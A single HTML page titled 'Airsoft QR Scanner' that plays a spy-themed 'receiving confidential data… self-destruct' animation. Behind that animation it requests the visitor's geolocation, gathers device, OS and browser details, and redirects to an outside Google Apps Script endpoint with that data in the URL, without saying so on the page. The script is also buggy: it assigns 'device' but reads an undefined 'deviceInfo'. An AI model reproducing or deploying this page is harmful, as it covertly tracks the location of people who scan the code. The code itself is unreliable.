<!DOCTYPE html>
<html>
<head>
  <title>Airsoft QR Scanner</title>
  <style>
    body {
      background-color: black;
      color: red;
      font-family: monospace;
      overflow: hidden;
      text-align: center;
    }

    #confidential {
      font-size: 40px;
      margin-top: 20%;
      animation: blink 1s infinite;
    }

    #data {
      margin-top: 20px;
      font-size: 20px;
    }

    @keyframes blink {
      0% { opacity: 1; }
      50% { opacity: 0; }
      100% { opacity: 1; }
    }

    @keyframes countdown {
      from { opacity: 1; }
      to { opacity: 0; }
    }
  </style>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.28/ua-parser.min.js"></script>
  <script>
    let interval;
    const confidentialMessages = [
      "Receiving confidential data...",
      "Decrypting message...",
      "Data received successfully",
      "This message will self-destruct in"
    ];

    function getDeviceInfo() {
      const parser = new UAParser();
      const result = parser.getResult();
      return {
        device: result.device.model || "Unknown Device",
        os: result.os.name + " " + result.os.version,
        browser: result.browser.name + " " + result.browser.version
      };
    }

    function getGeoLocation() {
      const confidentialDiv = document.getElementById('confidential');
      const dataDiv = document.getElementById('data');
      let messageIndex = 0;

      confidentialDiv.textContent = confidentialMessages[messageIndex];
      messageIndex++;

      interval = setInterval(() => {
        if (messageIndex < confidentialMessages.length) {
          confidentialDiv.textContent = confidentialMessages[messageIndex];
          messageIndex++;
        } else {
          clearInterval(interval);
          dataDiv.style.display = 'block';
          let countdown = 5;
          dataDiv.textContent = `${countdown} seconds...`;
          let countdownInterval = setInterval(() => {
            countdown--;
            dataDiv.textContent = `${countdown} seconds...`;
            if (countdown <= 0) {
              clearInterval(countdownInterval);
              confidentialDiv.textContent = "Self-destructing...";
              confidentialDiv.style.animation = "countdown 3s forwards";
              setTimeout(() => {
                window.close();
              }, 3000);
            }
          }, 1000);
        }
      }, 2000);

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
          setTimeout(() => {
            var latitude = position.coords.latitude;
            var longitude = position.coords.longitude;
            var device = getDeviceInfo();
            
            var scriptUrl = "https://script.google.com/macros/s/AKfycbzTqZTXXRolJY6ClLC_v9RjmWaeiVdfqoCz0BApRb7yr5rL8TuDDzNUpkAWteP4uzXY8w/exec";
            var url = `${scriptUrl}?latitude=${latitude}&longitude=${longitude}&device=${encodeURIComponent(deviceInfo.device)}&os=${encodeURIComponent(deviceInfo.os)}&browser=${encodeURIComponent(deviceInfo.browser)}`;
            
            console.log(url); // Imprimir URL para depuraci√≥n

            // Redirigir a la URL del script
            window.location.href = url;
          }, 10000); // 10 segundos para permitir mostrar los mensajes
        });
      } else {
        alert("Geolocation is not supported by this browser.");
      }
    }
  </script>
</head>
<body onload="getGeoLocation()">
  <div id="confidential"></div>
  <div id="data" style="display: none;"></div>
</body>
</html>
